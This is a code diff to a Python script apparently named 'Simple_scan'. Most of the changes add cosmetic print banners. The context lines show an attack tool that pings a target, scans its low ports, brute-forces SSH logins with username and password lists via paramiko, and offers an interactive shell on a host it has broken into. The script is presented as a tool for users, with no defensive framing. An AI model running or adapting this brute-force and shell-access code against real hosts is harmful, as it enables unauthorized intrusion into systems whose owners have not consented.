@@ -10,6 +10,9 @@ import sys
 
 def is_target_alive(ip):  # Sends a ping request to check if an host is alive.
     try:
+        print("__________________________________________________")
+        print(f"Pinging target: {target_ip}\n")
+
         # Run the ping command for windows and Unix OS
         result = os.system(f"ping -c 1 {ip}" if os.name != 'nt' else f"ping -n 1 {ip}")
 
@@ -26,6 +29,9 @@ def is_target_alive(ip):  # Sends a ping request to check if an host is alive.
 
 
 def scan_ports(ip):
+    print("__________________________________________________")
+    print("[+] Starting port scan!")
+    print("__________________________________________________")
     open_ports = []
     for port in range(1, 100):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,10 +40,12 @@ def scan_ports(ip):
         if result == 0:
             open_ports.append(port)
         sock.close()
-    print(f"Open ports: {open_ports}")
+    print(f"[-] Open ports: {open_ports}")
+    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
     return open_ports
 
 def attempt_ssh_login(ip, username, password):
+    print("")
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
@@ -74,12 +82,12 @@ def brute_force_ssh(ip):
     # Attempt each username-password combination
     for username in usernames:
         for password in passwords:
-            print(f"Trying Username: {username}, Password: {password}")
+            print(f"[+] Trying Username: {username}, Password: {password}")
             ssh = attempt_ssh_login(ip, username, password)
             if ssh:
                 return ssh, username, password
 
-    print("SSH brute force attempt failed with provided username and password files.")
+    print("[*] SSH brute force attempt failed with provided username and password files.")
     return None, None, None
 
 
@@ -135,11 +143,13 @@ def interactive_shell(ssh):
 def main(ip):
     if is_target_alive(ip):
         open_ports = scan_ports(ip)
+        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
         if 22 in open_ports:
+            print("[+] Trying to connect via SSH.\n [-] Starting Brute Force...")
             ssh, username, password = brute_force_ssh(ip)
             if ssh:
-                print(f"Successful login with Username: {username}, Password: {password}")
-                option = input("Do you want to open an interactive shell? (y/n): ")
+                print(f"[+] Successful login with Username: {username}, Password: {password}")
+                option = input("[-] Do you want to open an interactive shell? (y/n): ")
                 if option.lower() == 'y':
                     interactive_shell(ssh)
                 ssh.close()
@@ -153,6 +163,7 @@ def main(ip):
 if __name__ == "__main__":
     target_ip = input("Enter target IP: ")
     main(target_ip)
+    print("Thank you for using Simple_scan we hope you enjoy it!")
 
 
 
